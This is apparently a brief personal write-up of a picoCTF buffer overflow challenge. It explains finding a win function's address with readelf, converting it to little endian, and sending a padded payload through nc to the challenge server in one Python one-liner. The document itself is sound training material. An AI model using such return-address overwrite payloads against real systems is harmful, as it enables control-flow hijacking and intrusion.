Based on previous buffer overflow CTF, I tried passsing various lengths of data and did manage to get an error, but wasn't sure where to go from there. Watched John Hammond's video on this CTF. Learned about readelf -s to get the symbols from the executable, including the address to the win function. Then how to convert that to proper format (little endian) and pass it in with our input to get the program to change which function it ran.

Fast way:
python -c "import sys; sys.stdout.buffer.write(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08\n')" | nc saturn.picoctf.net 56006

Long way: exploit.py
